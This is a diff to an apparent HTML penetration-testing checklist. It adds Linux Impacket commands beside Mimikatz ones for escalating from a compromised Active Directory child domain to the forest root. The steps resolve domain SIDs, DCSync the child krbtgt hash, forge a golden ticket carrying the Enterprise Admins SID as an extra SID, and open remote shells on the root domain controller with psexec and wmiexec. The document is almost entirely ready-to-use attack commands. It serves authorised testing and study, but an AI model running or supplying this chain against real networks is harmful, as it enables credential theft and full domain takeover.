@@ -9291,13 +9291,32 @@ reg.exe save hklm\system C:\system.bak</code></pre>
     <pre><code class="language-powershell">Get-DomainSID -Domain [child-domain]
 Get-DomainSID -Domain [root-domain]
 .\mimikatz.exe "lsadump::dcsync /domain:[child-domain] /user:[child-netbios]\krbtgt"</code></pre>
+    <pre><code class="language-bash"># Resolve the child-domain SID from Linux
+impacket-lookupsid [child-domain]/[user]:'[password]'@[child-dc-ip] 0
+
+# Resolve the root-domain SID across the trust
+impacket-lookupsid [child-domain]/[user]:'[password]'@[root-dc-ip] 0
+
+# DCSync the child-domain krbtgt hash after child-domain compromise
+impacket-secretsdump [child-domain]/[admin-user]:'[password]'@[child-dc-ip] -just-dc-user krbtgt</code></pre>
   </li>
   <li><label><input type="checkbox"> Forge a child-domain golden ticket with root Enterprise Admins SID as ExtraSid</label>
     <pre><code class="language-powershell">.\mimikatz.exe "kerberos::golden /user:[user] /domain:[child-domain] /sid:[child-sid] /krbtgt:[child-krbtgt-ntlm] /sids:[root-sid]-519 /ptt"</code></pre>
+    <pre><code class="language-bash"># Build the trust-abuse TGT from Linux; [root-sid]-519 is Enterprise Admins
+impacket-ticketer -nthash [child-krbtgt-ntlm] -domain-sid [child-sid] -domain [child-domain] -extra-sid [root-sid]-519 [user]
+
+# Load the forged Kerberos ticket for Impacket tools
+export KRB5CCNAME=[user].ccache</code></pre>
   </li>
   <li><label><input type="checkbox"> Access root-domain resources by hostname to use Kerberos</label>
     <pre><code class="language-powershell">dir \\[root-dc].[root-domain]\c$
 klist</code></pre>
+    <pre><code class="language-bash"># Confirm the forged ticket is loaded
+klist
+
+# Use hostnames/FQDNs so Kerberos is used across the trust
+impacket-psexec -k -no-pass [root-dc].[root-domain]
+impacket-wmiexec -k -no-pass [root-dc].[root-domain]</code></pre>
   </li>
 </ul>
 
